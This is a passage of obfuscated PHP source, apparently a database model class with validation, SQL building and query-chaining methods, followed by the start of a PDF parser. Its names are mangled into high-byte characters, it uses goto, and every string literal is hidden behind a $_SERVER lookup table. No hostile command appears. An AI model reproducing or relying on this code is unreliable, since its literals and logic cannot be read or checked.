Aø…‘‚² ; Aø…‘‚² : $B¯ÓÆ‡ƒ¨¾ = $this->parseFieldsMap($B¯ÓÆ‡ƒ¨¾, 0); $e™Ñ‹ˆ¿Ìù = $e™Ñ‹ˆ¿Ìù ? $e™Ñ‹ˆ¿Ìù : (!empty($B¯ÓÆ‡ƒ¨¾[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$Dë½ë©Ø•—[257]])) { $E™‹çè×Ê˜ = $this->options[$Dë½ë©Ø•—[257]]; unset($this->options[$Dë½ë©Ø•—[257]]); } elseif ($e™Ñ‹ˆ¿Ìù == THINK_MODEL_INSERT && isset($this->insertFields)) { $E™‹çè×Ê˜ = $this->insertFields; } elseif ($e™Ñ‹ˆ¿Ìù == THINK_MODEL_UPDATE && isset($this->updateFields)) { $E™‹çè×Ê˜ = $this->updateFields; } goto EÌ×‚ÇÏ“ˆ; dÒéò’‘ŸÂ: } public function autoCheckToken($bÌÎ©ØåòØ) { $DìÂÍ¹Ş³À =& $_SERVER[Ìó]; if (isset($this->options[$DìÂÍ¹Ş³À[285]]) && !$this->options[$DìÂÍ¹Ş³À[285]]) { return !0; } if (think_config($DìÂÍ¹Ş³À[282])) { $a²š—¬…« = think_config($DìÂÍ¹Ş³À[283]); if (!isset($bÌÎ©ØåòØ[$a²š—¬…«]) || Session::get($a²š—¬…«)) { return !1; } list($B’ …§×ß¤, $D¨×³Ôõ¥É) = explode($DìÂÍ¹Ş³À[70], $bÌÎ©ØåòØ[$a²š—¬…«]); if ($D¨×³Ôõ¥É && Session::get($a²š—¬…« . $DìÂÍ¹Ş³À[91] . $B’ …§×ß¤) === $D¨×³Ôõ¥É) { Session::remove($a²š—¬…« . $DìÂÍ¹Ş³À[91] . $B’ …§×ß¤); return !0; } if (think_config($DìÂÍ¹Ş³À[286])) { Session::remove($a²š—¬…« . $DìÂÍ¹Ş³À[91] . $B’ …§×ß¤); } return !1; } return !0; } public function regex($c½ã„¢Ëš, $FëŒ®äíÚø) { $E­ƒŠ‹­ì =& $_SERVER[Ìó]; $FÆŒ†ƒ³„Ô = array($E­ƒŠ‹­ì[287] => $E­ƒŠ‹­ì[288], $E­ƒŠ‹­ì[289] => $E­ƒŠ‹­ì[290], $E­ƒŠ‹­ì[291] => $E­ƒŠ‹­ì[292], $E­ƒŠ‹­ì[293] => $E­ƒŠ‹­ì[294], $E­ƒŠ‹­ì[295] => $E­ƒŠ‹­ì[296], $E­ƒŠ‹­ì[297] => $E­ƒŠ‹­ì[298], $E­ƒŠ‹­ì[299] => $E­ƒŠ‹­ì[300], $E­ƒŠ‹­ì[274] => $E­ƒŠ‹­ì[301], $E­ƒŠ‹­ì[302] => $E­ƒŠ‹­ì[303]); if (isset($FÆŒ†ƒ³„Ô[strtolower($FëŒ®äíÚø)])) { $FëŒ®äíÚø = $FÆŒ†ƒ³„Ô[strtolower($FëŒ®äíÚø)]; } return preg_match($FëŒ®äíÚø, $c½ã„¢Ëš) === 1; } private function autoOperation(&$e³¾„é÷µÒ, $C“¾â™…) { $d‚š•ïÜ¿ù =& $_SERVER[Ìó]; if (!empty($this->options[$d‚š•ïÜ¿ù[304]])) { $aØì¥ìÅÈ° = $this->options[$d‚š•ïÜ¿ù[304]]; unset($this->options[$d‚š•ïÜ¿ù[304]]); } elseif (!empty($this->_auto)) { $aØì¥ìÅÈ° = $this->_auto; } if (isset($aØì¥ìÅÈ°)) { foreach ($aØì¥ìÅÈ° as $CÙ¸±Úöé) { if (empty($CÙ¸±Úöé[2])) { $CÙ¸±Úöé[2] = THINK_MODEL_INSERT; } if ($C“¾â™… == $CÙ¸±Úöé[2] || $CÙ¸±Úöé[2] == THINK_MODEL_BOTH) { switch (trim($CÙ¸±Úöé[3])) { case $d‚š•ïÜ¿ù[305]: case $d‚š•ïÜ¿ù[306]: $c‚ÎÒ¥ñ“Œ = isset($CÙ¸±Úöé[4]) ? (array) $CÙ¸±Úöé[4] : array(); if (isset($e³¾„é÷µÒ[$CÙ¸±Úöé[0]])) { array_unshift($c‚ÎÒ¥ñ“Œ, $e³¾„é÷µÒ[$CÙ¸±Úöé[0]]); } if ($d‚š•ïÜ¿ù[305] == $CÙ¸±Úöé[3]) { $e³¾„é÷µÒ[$CÙ¸±Úöé[0]] = call_user_func_array($CÙ¸±Úöé[1], $c‚ÎÒ¥ñ“Œ); } else { $e³¾„é÷µÒ[$CÙ¸±Úöé[0]] = call_user_func_array(array(&$this, $CÙ¸±Úöé[1]), $c‚ÎÒ¥ñ“Œ); } break; case $d‚š•ïÜ¿ù[257]: $e³¾„é÷µÒ[$CÙ¸±Úöé[0]] = $e³¾„é÷µÒ[$CÙ¸±Úöé[1]]; break; case $d‚š•ïÜ¿ù[307]: if ($d‚š•ïÜ¿ù[33] === $e³¾„é÷µÒ[$CÙ¸±Úöé[0]]) { unset($e³¾„é÷µÒ[$CÙ¸±Úöé[0]]); } break; case $d‚š•ïÜ¿ù[308]: default: $e³¾„é÷µÒ[$CÙ¸±Úöé[0]] = $CÙ¸±Úöé[1]; } if (!1 === $e³¾„é÷µÒ[$CÙ¸±Úöé[0]]) { unset($e³¾„é÷µÒ[$CÙ¸±Úöé[0]]); } } } } return $e³¾„é÷µÒ; } protected function autoValidation($eÇìÍõ×ˆ‚, $bóƒÕ­çŞ) { $aä£šÖí­ =& $_SERVER[Ìó]; if (!empty($this->options[$aä£šÖí­[309]])) { $F‡ÄÏ¢‘çÔ = $this->options[$aä£šÖí­[309]]; unset($this->options[$aä£šÖí­[309]]); } elseif (!empty($this->_validate)) { $F‡ÄÏ¢‘çÔ = $this->_validate; } if (isset($F‡ÄÏ¢‘çÔ)) { if ($this->patchValidate) { $this->error = array(); } foreach ($F‡ÄÏ¢‘çÔ as $f±¬é¶‡Ñ· => $DÉ¾çÆ¿„) { if (empty($DÉ¾çÆ¿„[5]) || $DÉ¾çÆ¿„[5] == THINK_MODEL_BOTH || $DÉ¾çÆ¿„[5] == $bóƒÕ­çŞ) { if (0 == strpos($DÉ¾çÆ¿„[2], $aä£šÖí­[310]) && strpos($DÉ¾çÆ¿„[2], $aä£šÖí­[311])) { $DÉ¾çÆ¿„[2] = think_lang(substr($DÉ¾çÆ¿„[2], 2, -1)); } $DÉ¾çÆ¿„[3] = isset($DÉ¾çÆ¿„[3]) ? $DÉ¾çÆ¿„[3] : THINK_EXISTS_VALIDATE; $DÉ¾çÆ¿„[4] = isset($DÉ¾çÆ¿„[4]) ? $DÉ¾çÆ¿„[4] : $aä£šÖí­[312]; switch ($DÉ¾çÆ¿„[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($eÇìÍõ×ˆ‚, $DÉ¾çÆ¿„)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($aä£šÖí­[33] != trim($eÇìÍõ×ˆ‚[$DÉ¾çÆ¿„[0]])) { if (!1 === $this->_validationField($eÇìÍõ×ˆ‚, $DÉ¾çÆ¿„)) { return !1; } } break; default: if (isset($eÇìÍõ×ˆ‚[$DÉ¾çÆ¿„[0]])) { if (!1 === $this->_validationField($eÇìÍõ×ˆ‚, $DÉ¾çÆ¿„)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($Aâñ¹ƒ®¥Œ, $FÂÛšá¯Üã) { if (!1 === $this->_validationFieldItem($Aâñ¹ƒ®¥Œ, $FÂÛšá¯Üã)) { if ($this->patchValidate) { $this->error[$FÂÛšá¯Üã[0]] = $FÂÛšá¯Üã[2]; } else { $this->error = $FÂÛšá¯Üã[2]; return !1; } } return; } protected function _validationFieldItem($cÑ›’›­Ñù, $Eõàë‚µ) { $eªÛ¤¿à =& $_SERVER[Ìó]; switch (strtolower(trim($Eõàë‚µ[4]))) { case $eªÛ¤¿à[305]: case $eªÛ¤¿à[306]: $eÇ“ˆ‚™Ñœ = isset($Eõàë‚µ[6]) ? (array) $Eõàë‚µ[6] : array(); if (is_string($Eõàë‚µ[0]) && strpos($Eõàë‚µ[0], $eªÛ¤¿à[47])) { $Eõàë‚µ[0] = explode($eªÛ¤¿à[47], $Eõàë‚µ[0]); } if (is_array($Eõàë‚µ[0])) { foreach ($Eõàë‚µ[0] as $a‡¯½¼¨Ø) { $bï½¦™è£â[$a‡¯½¼¨Ø] = $cÑ›’›­Ñù[$a‡¯½¼¨Ø]; } array_unshift($eÇ“ˆ‚™Ñœ, $bï½¦™è£â); } else { array_unshift($eÇ“ˆ‚™Ñœ, $cÑ›’›­Ñù[$Eõàë‚µ[0]]); } if ($eªÛ¤¿à[305] == $Eõàë‚µ[4]) { return call_user_func_array($Eõàë‚µ[1], $eÇ“ˆ‚™Ñœ); } else { return call_user_func_array(array(&$this, $Eõàë‚µ[1]), $eÇ“ˆ‚™Ñœ); } case $eªÛ¤¿à[313]: return $cÑ›’›­Ñù[$Eõàë‚µ[0]] == $cÑ›’›­Ñù[$Eõàë‚µ[1]]; case $eªÛ¤¿à[314]: if (is_string($Eõàë‚µ[0]) && strpos($Eõàë‚µ[0], $eªÛ¤¿à[47])) { $Eõàë‚µ[0] = explode($eªÛ¤¿à[47], $Eõàë‚µ[0]); } $Bô†šäñ­ˆ = array(); if (is_array($Eõàë‚µ[0])) { foreach ($Eõàë‚µ[0] as $a‡¯½¼¨Ø) { $Bô†šäñ­ˆ[$a‡¯½¼¨Ø] = $cÑ›’›­Ñù[$a‡¯½¼¨Ø]; } } else { $Bô†šäñ­ˆ[$Eõàë‚µ[0]] = $cÑ›’›­Ñù[$Eõàë‚µ[0]]; } if (!empty($cÑ›’›­Ñù[$this->getPk()])) { $Bô†šäñ­ˆ[$this->getPk()] = array($eªÛ¤¿à[315], $cÑ›’›­Ñù[$this->getPk()]); } if ($this->where($Bô†šäñ­ˆ)->find()) { return !1; } return !0; default: return $this->check($cÑ›’›­Ñù[$Eõàë‚µ[0]], $Eõàë‚µ[1], $Eõàë‚µ[4]); } } public function check($e×Ñï…ù², $cƒÎ±÷Ã«Ğ, $CÙÀÊÂÖ‡Å = "\x72\145\x67\x65\x78") { $Dáœ¨ÑÂ± =& $_SERVER[Ìó]; $CÙÀÊÂÖ‡Å = strtolower(trim($CÙÀÊÂÖ‡Å)); switch ($CÙÀÊÂÖ‡Å) { case $Dáœ¨ÑÂ±[7]: case $Dáœ¨ÑÂ±[316]: $Aå¹ Œ³ñ = is_array($cƒÎ±÷Ã«Ğ) ? $cƒÎ±÷Ã«Ğ : explode($Dáœ¨ÑÂ±[47], $cƒÎ±÷Ã«Ğ); return $CÙÀÊÂÖ‡Å == $Dáœ¨ÑÂ±[7] ? in_array($e×Ñï…ù², $Aå¹ Œ³ñ) : !in_array($e×Ñï…ù², $Aå¹ Œ³ñ); case $Dáœ¨ÑÂ±[317]: case $Dáœ¨ÑÂ±[318]: if (is_array($cƒÎ±÷Ã«Ğ)) { $F±¢ÜÎ¯É = $cƒÎ±÷Ã«Ğ[0]; $aÖ©‚ƒ³´ = $cƒÎ±÷Ã«Ğ[1]; } else { list($F±¢ÜÎ¯É, $aÖ©‚ƒ³´) = explode($Dáœ¨ÑÂ±[47], $cƒÎ±÷Ã«Ğ); } return $CÙÀÊÂÖ‡Å == $Dáœ¨ÑÂ±[317] ? $e×Ñï…ù² >= $F±¢ÜÎ¯É && $e×Ñï…ù² <= $aÖ©‚ƒ³´ : $e×Ñï…ù² < $F±¢ÜÎ¯É || $e×Ñï…ù² > $aÖ©‚ƒ³´; case $Dáœ¨ÑÂ±[319]: case $Dáœ¨ÑÂ±[320]: return $CÙÀÊÂÖ‡Å == $Dáœ¨ÑÂ±[319] ? $e×Ñï…ù² == $cƒÎ±÷Ã«Ğ : $e×Ñï…ù² != $cƒÎ±÷Ã«Ğ; case $Dáœ¨ÑÂ±[321]: $d¤òÊ‹Š´Â = mb_strlen($e×Ñï…ù², $Dáœ¨ÑÂ±[322]); if (strpos($cƒÎ±÷Ã«Ğ, $Dáœ¨ÑÂ±[47])) { list($F±¢ÜÎ¯É, $aÖ©‚ƒ³´) = explode($Dáœ¨ÑÂ±[47], $cƒÎ±÷Ã«Ğ); return $d¤òÊ‹Š´Â >= $F±¢ÜÎ¯É && $d¤òÊ‹Š´Â <= $aÖ©‚ƒ³´; } else { return $d¤òÊ‹Š´Â == $cƒÎ±÷Ã«Ğ; } case $Dáœ¨ÑÂ±[323]: list($BÚò«³ÊŠÛ, $E¸éÇ‹†Õˆ) = explode($Dáœ¨ÑÂ±[47], $cƒÎ±÷Ã«Ğ); if (!is_numeric($BÚò«³ÊŠÛ)) { $BÚò«³ÊŠÛ = strtotime($BÚò«³ÊŠÛ); } if (!is_numeric($E¸éÇ‹†Õˆ)) { $E¸éÇ‹†Õˆ = strtotime($E¸éÇ‹†Õˆ); } return NOW_TIME >= $BÚò«³ÊŠÛ && NOW_TIME <= $E¸éÇ‹†Õˆ; case $Dáœ¨ÑÂ±[324]: return in_array(get_client_ip(), explode($Dáœ¨ÑÂ±[47], $cƒÎ±÷Ã«Ğ)); case $Dáœ¨ÑÂ±[325]: return !in_array(get_client_ip(), explode($Dáœ¨ÑÂ±[47], $cƒÎ±÷Ã«Ğ)); case $Dáœ¨ÑÂ±[312]: default: return $this->regex($e×Ñï…ù², $cƒÎ±÷Ã«Ğ); } } public function query($e±›Ûä·Ü, $D±³‹„­ƒŒ = false) { $FÜáŒñ‚‚‰ =& $_SERVER[Ìó]; if (!is_bool($D±³‹„­ƒŒ) && !is_array($D±³‹„­ƒŒ)) { $D±³‹„­ƒŒ = func_get_args(); array_shift($D±³‹„­ƒŒ); } $e±›Ûä·Ü = str_replace(array($FÜáŒñ‚‚‰[213], $FÜáŒñ‚‚‰[326]), $FÜáŒñ‚‚‰[50], $e±›Ûä·Ü); $e±›Ûä·Ü = $this->parseSql($e±›Ûä·Ü, $D±³‹„­ƒŒ); return $this->db->query($e±›Ûä·Ü); } public function execute($a¡‰ØçÂ§Ş, $b‰âíÈÀÉÀ = false) { if (!is_bool($b‰âíÈÀÉÀ) && !is_array($b‰âíÈÀÉÀ)) { $b‰âíÈÀÉÀ = func_get_args(); array_shift($b‰âíÈÀÉÀ); } $a¡‰ØçÂ§Ş = $this->parseSql($a¡‰ØçÂ§Ş, $b‰âíÈÀÉÀ); return $this->db->execute($a¡‰ØçÂ§Ş); } protected function parseSql($eô•±ƒ†õ”, $fÆêˆ½) { $E”Ñ«— =& $_SERVER[Ìó]; if (!0 === $fÆêˆ½) { $CğŸöæ¬Ğñ = $this->_parseOptions(); $eô•±ƒ†õ” = $this->db->parseSql($eô•±ƒ†õ”, $CğŸöæ¬Ğñ); } elseif (is_array($fÆêˆ½)) { $fÆêˆ½ = array_map(array($this->db, $E”Ñ«—[327]), $fÆêˆ½); $eô•±ƒ†õ” = vsprintf($eô•±ƒ†õ”, $fÆêˆ½); } else { $eô•±ƒ†õ” = strtr($eô•±ƒ†õ”, array($E”Ñ«—[328] => $this->getTableName(), $E”Ñ«—[329] => think_config($E”Ñ«—[228]))); } $this->db->setModel($this->name); return $eô•±ƒ†õ”; } public function db($c®ĞîŒöÃª = '', $D†Ê›˜•åê = '', $CÛô¹±·º = array()) { goto f¬ÙçŞŸÄÔ; bãÑ¡Å¡†Ğ: static $E¶ßÊ†ì›ë = array(); if (!isset($E¶ßÊ†ì›ë[$c®ĞîŒöÃª]) || isset($E¶ßÊ†ì›ë[$c®ĞîŒöÃª]) && $D†Ê›˜•åê && $Côˆ Í‡¶æ[$c®ĞîŒöÃª] != $D†Ê›˜•åê) { if (!empty($D†Ê›˜•åê) && is_string($D†Ê›˜•åê) && !1 === strpos($D†Ê›˜•åê, $Aò­êô±—ó[8])) { $D†Ê›˜•åê = think_config($D†Ê›˜•åê); } $E¶ßÊ†ì›ë[$c®ĞîŒöÃª] = Db::getInstance($D†Ê›˜•åê); } elseif (NULL === $D†Ê›˜•åê) { $E¶ßÊ†ì›ë[$c®ĞîŒöÃª]->close(); unset($E¶ßÊ†ì›ë[$c®ĞîŒöÃª]); return; } if (!empty($CÛô¹±·º)) { if (is_string($CÛô¹±·º)) { parse_str($CÛô¹±·º, $CÛô¹±·º); } foreach ($CÛô¹±·º as $Aç—ÁÊŞ¹ƒ => $cŠˆ¼±ç‚·) { $this->setProperty($Aç—ÁÊŞ¹ƒ, $cŠˆ¼±ç‚·); } } goto B”©è¥±Í; B”©è¥±Í: $Côˆ Í‡¶æ[$c®ĞîŒöÃª] = $D†Ê›˜•åê; $this->db = $E¶ßÊ†ì›ë[$c®ĞîŒöÃª]; $this->_after_db(); goto FéøáÀÑÊß; f¬ÙçŞŸÄÔ: $Aò­êô±—ó =& $_SERVER[Ìó]; if ($Aò­êô±—ó[33] === $c®ĞîŒöÃª && $this->db) { return $this->db; } static $Côˆ Í‡¶æ = array(); goto bãÑ¡Å¡†Ğ; FéøáÀÑÊß: if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; goto DŞ”¬¥…¿; DŞ”¬¥…¿: } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $aØ‚ØÚ‡î± = get_class($this); if ($aØ‚ØÚ‡î± == $_SERVER[Ìó][330]) { return $this->name; } $this->name = substr($aØ‚ØÚ‡î±, 0, -5); } return $this->name; } public function getTableName() { $DƒÀÉ×Îš« =& $_SERVER[Ìó]; if (empty($this->trueTableName)) { $dòÙ÷×¦Ä¨ = !empty($this->tablePrefix) ? $this->tablePrefix : $DƒÀÉ×Îš«[33]; if (!empty($this->tableName)) { $dòÙ÷×¦Ä¨ .= $this->tableName; } else { $dòÙ÷×¦Ä¨ .= think_parse_name($this->name); } $this->trueTableName = strtolower($dòÙ÷×¦Ä¨); } return (!empty($this->dbName) ? $this->dbName . $DƒÀÉ×Îš«[91] : $DƒÀÉ×Îš«[33]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $B•‚­¥øØß =& $_SERVER[Ìó]; return isset($this->fields[$B•‚­¥øØß[235]]) ? $this->fields[$B•‚­¥øØß[235]] : $this->pk; } public function getDbFields() { $féåÉÙŸÒ¯ =& $_SERVER[Ìó]; if (isset($this->options[$féåÉÙŸÒ¯[263]])) { $c®ËÁ—Ç² = $this->db->getFields($this->options[$féåÉÙŸÒ¯[263]]); return $c®ËÁ—Ç² ? array_keys($c®ËÁ—Ç²) : !1; } if ($this->fields) { $c®ËÁ—Ç² = $this->fields; unset($c®ËÁ—Ç²[$féåÉÙŸÒ¯[234]], $c®ËÁ—Ç²[$féåÉÙŸÒ¯[235]], $c®ËÁ—Ç²[$féåÉÙŸÒ¯[236]], $c®ËÁ—Ç²[$féåÉÙŸÒ¯[233]]); return $c®ËÁ—Ç²; } return !1; } public function data($D”É–˜„‹¥ = '') { $fĞÃİ¬ÇĞ“ =& $_SERVER[Ìó]; if ($fĞÃİ¬ÇĞ“[33] === $D”É–˜„‹¥ && !empty($this->data)) { return $this->data; } if (is_object($D”É–˜„‹¥)) { $D”É–˜„‹¥ = get_object_vars($D”É–˜„‹¥); } elseif (is_string($D”É–˜„‹¥)) { parse_str($D”É–˜„‹¥, $D”É–˜„‹¥); } elseif (!is_array($D”É–˜„‹¥)) { think_exception(think_lang($fĞÃİ¬ÇĞ“[255])); } $this->data = $D”É–˜„‹¥; return $this; } public function join($AÅªØóÅ—³) { $CÈÚõ¹çô =& $_SERVER[Ìó]; if (is_array($AÅªØóÅ—³)) { $this->options[$CÈÚõ¹çô[266]] = $AÅªØóÅ—³; } elseif (!empty($AÅªØóÅ—³)) { $this->options[$CÈÚõ¹çô[266]][] = $AÅªØóÅ—³; } return $this; } public function union($cè³¼–Ëóã, $b›‘¨İ“Ö = false) { goto Eä¬À°ô¼‡; cëœ½Ã—: return $this; goto bèªôğ…ˆ¦; e­Õ¤ÖÉ¹Ğ: if (is_object($cè³¼–Ëóã)) { $cè³¼–Ëóã = get_object_vars($cè³¼–Ëóã); } if (is_string($cè³¼–Ëóã)) { $eÏ…Œ±àæï = $cè³¼–Ëóã; } elseif (is_array($cè³¼–Ëóã)) { if (isset($cè³¼–Ëóã[0])) { $this->options[$Eå¸¹³ìÒÌ[331]] = array_merge($this->options[$Eå¸¹³ìÒÌ[331]], $cè³¼–Ëóã); return $this; } else { $eÏ…Œ±àæï = $cè³¼–Ëóã; } } else { think_exception(think_lang($Eå¸¹³ìÒÌ[255])); } $this->options[$Eå¸¹³ìÒÌ[331]][] = $eÏ…Œ±àæï; goto cëœ½Ã—; Eä¬À°ô¼‡: $Eå¸¹³ìÒÌ =& $_SERVER[Ìó]; if (empty($cè³¼–Ëóã)) { return $this; } if ($b›‘¨İ“Ö) { $this->options[$Eå¸¹³ìÒÌ[331]][$Eå¸¹³ìÒÌ[332]] = !0; } goto e­Õ¤ÖÉ¹Ğ; bèªôğ…ˆ¦: } public function cache($däå £ÌÚ = true, $dÚêÅéÂ­ = null, $dÂİÌ‚¸À = '') { $a¬Ö¬Í’ï· =& $_SERVER[Ìó]; if (!1 !== $däå £ÌÚ) { $this->options[$a¬Ö¬Í’ï·[333]] = array($a¬Ö¬Í’ï·[89] => $däå £ÌÚ, $a¬Ö¬Í’ï·[323] => $dÚêÅéÂ­, $a¬Ö¬Í’ï·[29] => $dÂİÌ‚¸À); } return $this; } public function field($AÇè‹ïÃ¼±, $f¨¸‡£—à = false) { $eæ„ÒÒÄë‚ =& $_SERVER[Ìó]; if (!0 === $AÇè‹ïÃ¼±) { $FäÙÂ‡¸º— = $this->getDbFields(); $AÇè‹ïÃ¼± = $FäÙÂ‡¸º— ? $FäÙÂ‡¸º— : $eæ„ÒÒÄë‚[172]; } elseif ($f¨¸‡£—à) { if (is_string($AÇè‹ïÃ¼±)) { $AÇè‹ïÃ¼± = explode($eæ„ÒÒÄë‚[47], $AÇè‹ïÃ¼±); } $FäÙÂ‡¸º— = $this->getDbFields(); $AÇè‹ïÃ¼± = $FäÙÂ‡¸º— ? array_diff($FäÙÂ‡¸º—, $AÇè‹ïÃ¼±) : $AÇè‹ïÃ¼±; } $this->options[$eæ„ÒÒÄë‚[257]] = $AÇè‹ïÃ¼±; return $this; } public function scope($B­ÉÇÚÀí§ = '', $f¾£Ôè÷â = NULL) { $dˆÚ¬ÔÉ“œ =& $_SERVER[Ìó]; if ($dˆÚ¬ÔÉ“œ[33] === $B­ÉÇÚÀí§) { if (isset($this->_scope[$dˆÚ¬ÔÉ“œ[34]])) { $A‹Ü¦á¨ìæ = $this->_scope[$dˆÚ¬ÔÉ“œ[34]]; } else { return $this; } } elseif (is_string($B­ÉÇÚÀí§)) { $eô›Ìä“É› = explode($dˆÚ¬ÔÉ“œ[47], $B­ÉÇÚÀí§); $A‹Ü¦á¨ìæ = array(); foreach ($eô›Ìä“É› as $bòš§²¹Œš) { if (!isset($this->_scope[$bòš§²¹Œš])) { continue; } $A‹Ü¦á¨ìæ = array_merge($A‹Ü¦á¨ìæ, $this->_scope[$bòš§²¹Œš]); } if (!empty($f¾£Ôè÷â) && is_array($f¾£Ôè÷â)) { $A‹Ü¦á¨ìæ = array_merge($A‹Ü¦á¨ìæ, $f¾£Ôè÷â); } } elseif (is_array($B­ÉÇÚÀí§)) { $A‹Ü¦á¨ìæ = $B­ÉÇÚÀí§; } if (is_array($A‹Ü¦á¨ìæ) && !empty($A‹Ü¦á¨ìæ)) { $this->options = array_merge($this->options, array_change_key_case($A‹Ü¦á¨ìæ)); } return $this; } public function where($Aè˜Ä…‘ØÆ, $E³Ùìš°Öğ = null) { $DÁ˜£òñÓ¯ =& $_SERVER[Ìó]; if (!is_null($E³Ùìš°Öğ) && is_string($Aè˜Ä…‘ØÆ)) { if (!is_array($E³Ùìš°Öğ)) { $E³Ùìš°Öğ = func_get_args(); array_shift($E³Ùìš°Öğ); } $E³Ùìš°Öğ = array_map(array($this->db, $DÁ˜£òñÓ¯[327]), $E³Ùìš°Öğ); $Aè˜Ä…‘ØÆ = vsprintf($Aè˜Ä…‘ØÆ, $E³Ùìš°Öğ); } elseif (is_object($Aè˜Ä…‘ØÆ)) { $Aè˜Ä…‘ØÆ = get_object_vars($Aè˜Ä…‘ØÆ); } elseif (is_array($Aè˜Ä…‘ØÆ)) { foreach ($Aè˜Ä…‘ØÆ as $Cñ¶Œöâ— => $Fˆå„í†Ïì) { if ((is_numeric($Cñ¶Œöâ—) || !$Cñ¶Œöâ—) && is_string($Fˆå„í†Ïì)) { think_trace($DÁ˜£òñÓ¯[334], $DÁ˜£òñÓ¯[33], $DÁ˜£òñÓ¯[46]); die; } } } if (is_string($Aè˜Ä…‘ØÆ) && $DÁ˜£òñÓ¯[33] != $Aè˜Ä…‘ØÆ) { $e°ôË‹Ë = array(); $e°ôË‹Ë[$DÁ˜£òñÓ¯[335]] = $Aè˜Ä…‘ØÆ; $Aè˜Ä…‘ØÆ = $e°ôË‹Ë; } if (isset($this->options[$DÁ˜£òñÓ¯[259]])) { $this->options[$DÁ˜£òñÓ¯[259]] = array_merge($this->options[$DÁ˜£òñÓ¯[259]], $Aè˜Ä…‘ØÆ); } else { $this->options[$DÁ˜£òñÓ¯[259]] = $Aè˜Ä…‘ØÆ; } return $this; } public function limit($Bª…‚öÓÓ, $FšÈæ£Ó³´ = null) { $e¤‡Š¿¤¯ø =& $_SERVER[Ìó]; $this->options[$e¤‡Š¿¤¯ø[276]] = is_null($FšÈæ£Ó³´) ? $Bª…‚öÓÓ : $Bª…‚öÓÓ . $e¤‡Š¿¤¯ø[47] . $FšÈæ£Ó³´; return $this; } public function page($DçÉ‹‚ß¾“, $C’Ü”“È· = null) { $f”Ü±êÕˆÔ =& $_SERVER[Ìó]; $this->options[$f”Ü±êÕˆÔ[336]] = is_null($C’Ü”“È·) ? $DçÉ‹‚ß¾“ : $DçÉ‹‚ß¾“ . $f”Ü±êÕˆÔ[47] . $C’Ü”“È·; return $this; } public function comment($F‘¢…¿ÌÛÇ) { $this->options[$_SERVER[Ìó][337]] = $F‘¢…¿ÌÛÇ; return $this; } public function setProperty($DÀÌ‡†¥, $fì×ÇÌå÷í) { if (property_exists($this, $DÀÌ‡†¥)) { $this->{$DÀÌ‡†¥} = $fì×ÇÌå÷í; } return $this; } } goto A§ÏÜöšÂà; cğê»÷—Ä‰: class FileParsePdf { public static function parse($FœÙæöÔÏ³) { goto dêù¹ÍÖ; B¼‡¥÷Ëµ: if ($Féí°¨Ñç¥[1] && $F•ğêÏĞâ[$báêšÅ§Ø¿[1508]] < $Féí°¨Ñç¥[1][0]) { $F•ğêÏĞâ[$báêšÅ§Ø¿[1508]] = $Féí°¨Ñç¥[1][0]; } $F•ğêÏĞâ = self::parseInfoItem($F•ğêÏĞâ); return $F•ğêÏĞâ; goto Fó¨ÇŒ¥†­; A“Š¹´Âõ: if ($Féí°¨Ñç¥) { $F•ğêÏĞâ[$báêšÅ§Ø¿[1316]] = $Féí°¨Ñç¥[1]; } $F•ğêÏĞâ[$báêšÅ§Ø¿[1508]] = 0; $C¶’¡®öÑî = $báêšÅ§Ø¿[1509]; goto AĞ©‰İöàÁ; AĞ©‰İöàÁ: preg_match_all($C¶’¡®öÑî, $E±×ç–ó[$báêšÅ§Ø¿[1501]], $Féí°¨Ñç¥); if ($Féí°¨Ñç¥[1] && $F•ğêÏĞâ[$báêšÅ§Ø¿[1508]] < $Féí°¨Ñç¥[1][0]) { $F•ğêÏĞâ[$báêšÅ§Ø¿[1508]] = $Féí°¨Ñç¥[1][0]; } preg_match_all($C¶’¡®öÑî, $E±×ç–ó[$báêšÅ§Ø¿[1502]], $Féí°¨Ñç¥); goto B¼‡¥÷Ëµ; eôÚ¨£ìŞ: preg_match($C¶’¡®öÑî, $E±×ç–ó[$báêšÅ§Ø¿[1502]], $Féí°¨Ñç¥); if (!$F•ğêÏĞâ[$báêšÅ§Ø¿[1504]] && count($Féí°¨Ñç¥) == 5) { $F•ğêÏĞâ[$báêšÅ§Ø¿[1504]] = $Féí°¨Ñç¥[3]; $F•ğêÏĞâ[$báêšÅ§Ø¿[1506]] = $Féí°¨Ñç¥[4]; } preg_match($báêšÅ§Ø¿[1507], $E±×ç–ó[$báêšÅ§Ø¿[1501]], $Féí°¨Ñç¥); goto A“Š¹´Âõ; dßÑéÍå’é: $E±×ç–ó[$báêšÅ§Ø¿[1501]] = StreamWrapperIO::read($FœÙæöÔÏ³, 0, $Fƒ‰´ Ò¾ä); $E±×ç–ó[$báêšÅ§Ø¿[1502]] = StreamWrapperIO::read($FœÙæöÔÏ³, $E±×ç–ó[$báêšÅ§Ø¿[77]] - $Fƒ‰´ Ò¾ä, $Fƒ‰´ Ò¾ä); $D”ĞçâÈ„» = self::decodeXref($E±×ç–ó); goto c“´óï¢¹ä; dêù¹ÍÖ: $báêšÅ§Ø¿ =& $_SERVER[Ìó]; $Fƒ‰´ Ò¾ä = 32 * 1024; $E±×ç–ó = array($báêšÅ§Ø¿[779] => fopen($FœÙæöÔÏ³, $báêšÅ§Ø¿[1158]), $báêšÅ§Ø¿[75] => $FœÙæöÔÏ³, $báêšÅ§Ø¿[77] => filesize($FœÙæöÔÏ³), $báêšÅ§Ø¿[1500] => $Fƒ‰´ Ò¾ä); goto dßÑéÍå’é; c“´óï¢¹ä: if ($D”ĞçâÈ„») { $aì‘ù²²Ä‡ = $D”ĞçâÈ„»[$báêšÅ§Ø¿[1503]][$báêšÅ§Ø¿[1180]]; $F•ğêÏĞâ = self::getObjectValue($E±×ç–ó, $D”ĞçâÈ„», $aì‘ù²²Ä‡); } $F•ğêÏĞâ = 